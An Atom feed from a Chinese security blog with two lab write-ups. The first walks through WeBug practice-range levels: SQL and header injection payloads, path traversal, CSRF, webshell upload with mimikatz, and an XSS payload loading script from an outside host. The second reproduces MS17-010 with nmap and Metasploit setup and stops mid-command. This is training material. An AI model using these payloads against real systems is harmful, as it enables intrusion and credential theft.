<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Louisnie</title>
  
  <subtitle>Attitude determines Altitude!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://louisnie.github.io/"/>
  <updated>2019-01-12T17:29:21.971Z</updated>
  <id>https://louisnie.github.io/</id>
  
  <author>
    <name>Louisnie</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WebBug靶机基础实验</title>
    <link href="https://louisnie.github.io/2019/02/25/WebBug%E9%9D%B6%E6%9C%BA%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C/"/>
    <id>https://louisnie.github.io/2019/02/25/WebBug靶机基础实验/</id>
    <published>2019-02-24T17:38:25.555Z</published>
    <updated>2019-01-12T17:29:21.971Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">男儿不展同云志，空负天生八尺躯!</blockquote></p><div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div><h2 id="weBug环境介绍"><a href="#weBug环境介绍" class="headerlink" title="weBug环境介绍:"></a>weBug环境介绍:</h2><blockquote><p>WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入门。</p></blockquote><h2 id="WeBug安装使用"><a href="#WeBug安装使用" class="headerlink" title="WeBug安装使用:"></a>WeBug安装使用:</h2><blockquote><p>此安装包webug是3.0版本，所有的漏洞环境都已经搭建好了，解压后只要在vm虚拟机内打开，就可直接使用测试，无需繁琐的环境配置。<br>具体操作：用winrar将安装包解压，用VM虚拟机打开解压文件里的win2003虚拟机文件。进入虚拟机系统后，打开命令行，输入：ipconfig，查看虚拟机的IP地址，然后直接在物理机的浏览器上输入该IP地址，就可以直接进入靶场了。</p></blockquote><h2 id="WeBug包含的漏洞"><a href="#WeBug包含的漏洞" class="headerlink" title="WeBug包含的漏洞:"></a>WeBug包含的漏洞:</h2><blockquote><p>目前该靶场包含以下漏洞（超全！特别适合练手）:<br>get注入；图片破解；信息收集练习——目录端口收集；暴力破解练习；x-forwarded-for注入；支付漏洞；垂直越权；CSRF；url跳转；GET任意文件下载；POST任意文件下载；无验证上传；反射型XSS；存储型XSS；校验扩展名上传；验证来源去向的url跳转；文件包含；POST文件包含；HOST注入；APK破解；延时注入；DZ7.2论坛sql注入；aspcms注入；phpmyadmin任意文件包含漏洞；齐博系统SQL注入；海盗云商getshell；PHP168任意代码执行GET SHELL；ecshop 注入；ShopXp系统SQL注射漏洞；Dcore(轻型CMS系统)注入漏洞；MetInfo 任意文件包含漏洞可getshell；Metinfo news.php盲注；Metinfo img.php盲注；万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入；BEESCMS sql注入，无视防御；ourphp 注入；phpwind 命令执行漏洞；metinfo  任意用户密码修改；DZ 3.2 存储型XSS；DedeCMS flink.php友情链接注入；DedeCms?recommend.php注入；BEESCMS 小于等于V4四处注入+无需密码直接进后台；海洋 x-forwarded-for注入；php截断利用；st2-016；jboss命令执行；tomcat弱口令；hfs远程命令执行；st2-052命令执行；flash远程命令执行；gh0st远程溢出；IIS6.0远程溢出<br>下载链接：<a href="https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ</a><br>提取码：cfyr </p></blockquote><h2 id="第一关-普通的GET注入"><a href="#第一关-普通的GET注入" class="headerlink" title="第一关:普通的GET注入"></a>第一关:普通的GET注入</h2><p>提交id为1,出现编号1的商品,输入1’,系统出现查询数据库错误的提示<br><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fz49iroc6rj31cw0cmq4d.jpg" alt="image"><br>那么接下来爆系统SQL语句查询的字段个数,其payload为:<br>1’ order by 5–+<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz49jkz2brj30mw0bqaad.jpg" alt="image"><br>将数字5换成4,结果返回正常,证明其查询的字段数是4个</p><p>然后爆字段所在位置,其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,4--+</span><br></pre></td></tr></table></figure></p><p>得到查询的字段分别位于”编号”,”名称”,”价格”,”数量”的位置<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz49ltvkahj30pr0hcjs4.jpg" alt="image"></p><p>查询当前用户,数据库版本,当前数据库名,其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,user(),version(),database()--+</span><br></pre></td></tr></table></figure></p><p>当前用户:root@localhost<br>版本为:5.5.53<br>数据库名:pentesterlab<br>查所有数据库库名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(schema_name)from information_schema.schemata --+</span><br></pre></td></tr></table></figure></p><p>得到的数据库为:<br>information_schema,beecms,dedecmsv57gbk,dedecmsv57gbksp1,deescms,discuz,<br>ecshop1,haidao,hiwiki,merinfo3,metinfo1,metinfo2,metinfoxiugai,mysql,<br>ourphp,pentesterlab,performance_schema,php168,phpwind,qibo,seacms,<br>test,ultrax,wanzhong,wiki,wiki11</p><p>查当前数据库中的表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema=&apos;pentesterlab&apos;--+</span><br></pre></td></tr></table></figure></p><p>得到的当前数据库pentesterlab中的所有表名:comment,flag,goods,user</p><p>查找flag表中的列名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;--+</span><br></pre></td></tr></table></figure></p><p>结果为:id,flag<br>查看其值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(id,0x7e,flag)from flag--+</span><br></pre></td></tr></table></figure></p><p>结果为:<br>1~204f704fbbcf6acf398ffee11989b377</p><h2 id="第二关-从图中你能找到什么"><a href="#第二关-从图中你能找到什么" class="headerlink" title="第二关: 从图中你能找到什么?"></a>第二关: 从图中你能找到什么?</h2><p>将图片保存到本地,notepad++打开就发现密码啦,官方说这道题有问题….<br><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fz49p6ni54j30fz04sglt.jpg" alt="image"></p><h2 id="第三关-你看到了什么"><a href="#第三关-你看到了什么" class="headerlink" title="第三关:你看到了什么?"></a>第三关:你看到了什么?</h2><p>查看源代码,原来是要扫目录呀,我用的是Windows系统,直接用御剑跑,Linux下可以用dirb或者dirbuster去跑</p><p>扫到了这个test目录,得到提示把目录名md5加密<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fz49qx72ccj30nz0bdt9h.jpg" alt="image"><br>访问加密后的值得到flag<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz49rsttp7j30xi0f2q5d.jpg" alt="image"></p><h2 id="第四关-告诉你了FLAG是5位数"><a href="#第四关-告诉你了FLAG是5位数" class="headerlink" title="第四关:告诉你了FLAG是5位数"></a>第四关:告诉你了FLAG是5位数</h2><p>遇到表单上burp爆破<br><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fz49tu3be9j30nw0j10tu.jpg" alt="image"><br>得到用户名admin.密码admin123<br>但是登录了没反应,后来发现是源码有问题,作者将flag注释了……<br><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fz49u05s0uj30te0ekt93.jpg" alt="image"></p><h2 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h2><p>X-Forwarded-For注入:<a href="http://" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/164817.html</a><br>两种方式解决这个问题(原理都是一样的)<br>1,用burpsuite抓包,添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag<br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fz49wu5v3wj30zn0h8jsl.jpg" alt="image"><br>第二种方式:使用火狐浏览器的Modify Headers,添加添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag,确定,刷新页面即可出现所查询的值<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fz49x135e4j31fu0na40i.jpg" alt="image"></p><h2 id="第六关-支付漏洞"><a href="#第六关-支付漏洞" class="headerlink" title="第六关:支付漏洞"></a>第六关:支付漏洞</h2><p>打开遇到个登录页面,爆破呗,得到账户名密码是tom/123456<br><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fz49yoefz6j30oc07cq3c.jpg" alt="image"><br>看着很像支付漏洞,抓包修改价格为0.1元,购买成功<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz49zawg9nj31fk0nv48j.jpg" alt="image"></p><h2 id="第七关-越权问题"><a href="#第七关-越权问题" class="headerlink" title="第七关:越权问题"></a>第七关:越权问题</h2><p>使用系统提供的账号密码登录<br>点击修改密码,发现是以GET请求的方式传递用户名进行修改密码的操作,那么尝试将用户名修改为admin用户,看能不能越权修改管理员账号<br>payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/3/change.php?name=admin</span><br></pre></td></tr></table></figure></p><p>是可以修改admin的密码的,但是需要旧密码,</p><p>查看其源码,只要输入的两次新密码正确就可以修改啦,不对原密码进行确认:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($pwd2==$pwd3)&#123;</span><br><span class="line">//更新记录</span><br><span class="line">$updateSql = &quot;update user set pwd = &apos;&quot;.$pwd2.&quot;&apos; where uid=&apos;&quot;.$uid.&quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($updateSql);</span><br><span class="line">if($result&gt;0)&#123;</span><br><span class="line">echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;更改密码成功，请重新登录！&apos;);location.href=&apos;index.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fz4a0y7p5wj30hy0b0jrm.jpg" alt="image"></p><h2 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h2><p>首先使用tom/123456登录,观察其URL为tom用户,将tom替换成admin即可修改管理员密码,然后输入新密码,burp抓包右键制作CSRF POC<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz4a1i0wtaj30te0db3zf.jpg" alt="image"><br>保存至一个HTML文件中,将访问该文件的网站链接发送给管理员,管理员一点击即可修改其密码为我刚刚修改之后的密码</p><h2 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h2><p>查看源码,发现index.php存在任意url跳转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$url=$_REQUEST[&apos;url&apos;];</span><br><span class="line">if($url!=null||$url!=&quot;&quot;)&#123;</span><br><span class="line">echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;成功跳转！&apos;);location.href=&apos;&quot;.$url.&quot;&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/5/index.php?url=www.baidu.com</span><br></pre></td></tr></table></figure></p><h2 id="第十关-GET类型任意下载漏洞"><a href="#第十关-GET类型任意下载漏洞" class="headerlink" title="第十关:GET类型任意下载漏洞"></a>第十关:GET类型任意下载漏洞</h2><p>打开链接提示404,查看源码源码又是源码写的有问题…..<br>我们直接去访问download.php<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz4a347hluj313s0j9gnj.jpg" alt="image"><br>网址为:<a href="http://192.168.239.131/pentest/test/6/1/download.php" target="_blank" rel="noopener">http://192.168.239.131/pentest/test/6/1/download.php</a><br>点击下载,发现传递了一个参数fname 是下载的文件名 那么可能可以修改文件名实现任意文件下载,其payload为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/download.php</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz4a49clxcj314o0jm11q.jpg" alt="image"><br>通过下载download.php这个文件证明存在任意文件下载漏洞,那么该去找存放管理员账号密码的文件<br>我直接使用御剑扫描其后台,发现在<a href="http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件" target="_blank" rel="noopener">http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件</a><br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fz4a6su1i6j30ld07qwel.jpg" alt="image"></p><p>那么构造的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4a7b93lfj30ii0bxmxm.jpg" alt="image"></p><h2 id="第11关-POST类型任意下载漏洞"><a href="#第11关-POST类型任意下载漏洞" class="headerlink" title="第11关:POST类型任意下载漏洞"></a>第11关:POST类型任意下载漏洞</h2><p>第10关是通过GET请求下载文件,第11关是通过POST请求下载文件,直接修改变量pic的值为config.php文件的路径即可<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4a8l5gvaj30yc0kpwn9.jpg" alt="image"></p><h2 id="第12关-D盘找密码"><a href="#第12关-D盘找密码" class="headerlink" title="第12关:D盘找密码"></a>第12关:D盘找密码</h2><p>上传个PHP木马,确定其上传路径<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz4a91khr1j312e0aqq34.jpg" alt="image"><br>直接传一句话木马，上传上去后，然后在菜刀中上传mimikatz<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz4aagdhbsj309501e0h3.jpg" alt="image"><br>得到系统管理员登录密码为123456~<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4aakp6f3j30gc078dfu.jpg" alt="image"></p><h2 id="第13关-反射型XSS"><a href="#第13关-反射型XSS" class="headerlink" title="第13关:反射型XSS"></a>第13关:反射型XSS</h2><p>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/9/?id=&lt;script src=http://c7.gg/bSTkf&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fz4ab6can0j315x09v3zc.jpg" alt="image"></p><h2 id="第14关-存储型XSS"><a href="#第14关-存储型XSS" class="headerlink" title="第14关:存储型XSS"></a>第14关:存储型XSS</h2><p>构造payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fz4ac4vqdej30g907zgmf.jpg" alt="image"></p><h2 id="第15题-上传漏洞"><a href="#第15题-上传漏洞" class="headerlink" title="第15题:上传漏洞"></a>第15题:上传漏洞</h2><p>制作一个图片马,上传,burp修改文件名为php即可成功上传<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4acrxrf5j30xh0id0vu.jpg" alt="image"><br>成功解析<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz4ad73mnbj31gz0h8q9h.jpg" alt="image"><br>菜刀连接<br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fz4adj84dfj30wz0c50ud.jpg" alt="image"></p><h2 id="第16题-明天双十一-我从公司网络去剁手了！"><a href="#第16题-明天双十一-我从公司网络去剁手了！" class="headerlink" title="第16题:明天双十一 我从公司网络去剁手了！"></a>第16题:明天双十一 我从公司网络去剁手了！</h2><p>折腾了一会没找到答案,查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if(strstr($url,&quot;www.taobao.com&quot;))&#123;</span><br><span class="line">if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123;</span><br><span class="line">if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">echo &quot;剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;不想剁手了&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;nono&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;哎呀，这里只允许10.10.10.10访问！！！&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;这个地方剁手不好，换个地方！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现必须要满足三个条件才可以获得flag<br>1.请求参数url=<a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a><br>2.referer为<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>3.HOST值为10.10.10.10<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fz4agqahytj30xu0dj0u1.jpg" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;男儿不展同云志，空负天生八尺躯!&lt;/blockquote&gt;&lt;/p&gt;
&lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwid
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="靶机实验" scheme="https://louisnie.github.io/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>与永恒之蓝的一场旅行</title>
    <link href="https://louisnie.github.io/2019/02/19/ms17-010/"/>
    <id>https://louisnie.github.io/2019/02/19/ms17-010/</id>
    <published>2019-02-19T14:22:28.000Z</published>
    <updated>2019-02-24T17:48:17.983Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">不断进步,直到羔羊变成雄狮!</blockquote></p><div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28285910&auto=1&height=66"></iframe></div><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景:"></a>漏洞背景:</h2><p>继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。</p><p>针对此次泄露的漏洞，微软提前发布了安全公告 MS17-010，修复了泄露的多个 SMB 远程命令执行漏洞。由于此次泄露的漏洞覆盖了大部分常见的 Windows 版本(包括微软不再提供更新服务的 Windows XP 和 Windows Server 2003)，网络空间中仍然存在大量可被入侵的设备</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><p>永恒之蓝漏洞是通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本:"></a>影响版本:</h2><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p><p>目前在Metasploit上集成的攻击载荷是ms17_010_psexec和ms17_010_eternalblue,我在网上搜了好久,也没找到什么有价值的答案,我自己总结的是两点区别:</p><p>一:ms17_010_psexec是SMB的远程代码执行漏洞,ms17_010_eternalblue是SMB的远程窗口内核池损坏漏洞</p><p> 二:ms17_010_psexec是针对于上述所说的Windows系统都适用的,而ms17_010_eternalblue只适用于win7和win server2008R2的全版本</p><p>这次我们使用ms17_010_psexec载荷进行渗透测试</p><h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提:"></a>利用前提:</h2><p>1.防火墙必须允许SMB流量出入</p><p>2.目标必须使用SMBv1协议</p><p>3.目标必须缺少MS17-010补丁</p><p>4.目标必须允许匿名IPC $和管道名</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境:"></a>复现环境:</h2><p>攻击机:kali 4.15.0-kali2-amd64(192.168.135.134)</p><p>靶机:Windows server2003(192.168.135.136)</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程:"></a>复现过程:</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用nmap对目标系统进行信息收集同时去扫描目标存在的漏洞(Nessus或者AWVS等扫描器都可以)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV --script=vuln -O 192.168.135.136</span><br></pre></td></tr></table></figure><p>参数-sV表示对目标主机进行软件版本的检测</p><p>参数–script=vuln表示适用nmap自带的漏洞库区扫描目标系统存在的漏洞</p><p>参数-O表示扫描目标的操作系统</p><p>由于nmap默认扫描常用的一千个端口,所以我这里为了节省时间就没有加-p选项</p><p>扫出来啦鼎鼎有名的ms08-067漏洞和ms17-010漏洞这两个远程代码执行的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h3><h4 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h4><p>我们使用Metasploit-Framework(简称MSF)去利用ms17-010远程代码执行漏洞</p><p>我们首先需要创建一个自己的数据库,将等会使用MSF获取的结果保存到我们自己的数据库中(也可以使用metasploit自带的数据库),MSF默认使用的数据库管理系统是PostgreSQL</p><p>打开Postgresql服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service postgresql start</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/postgresql start</span><br><span class="line">[ ok ] Starting postgresql (via systemctl): postgresql.service.</span><br></pre></td></tr></table></figure><p>查看数据库运行状态:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service postgresql status </span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (exited) since Mon 2019-02-18 16:22:16 CST; 24h ago</span><br><span class="line">  Process: 11732 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 11732 (code=exited, status=0/SUCCESS)</span><br><span class="line"></span><br><span class="line">2月 18 16:22:16 kali systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">2月 18 16:22:16 kali systemd[1]: Started PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure><p>切换到postgres用户(Postgresql数据库管理系统所创建的用户)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# su - postgres</span><br></pre></td></tr></table></figure><p>创建数据库管理员kkk:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# su - postgres </span><br><span class="line">postgres@kali:~$ createuser kkk -P</span><br><span class="line">为新角色输入的口令: </span><br><span class="line">再输入一遍:</span><br></pre></td></tr></table></figure><p>创建数据库及其属主,其语法为createdb –owner=属主 数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres@kali:~$ createdb  --owner=kkk database1</span><br></pre></td></tr></table></figure><p>然后就可以打开MSF终端利用漏洞啦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# 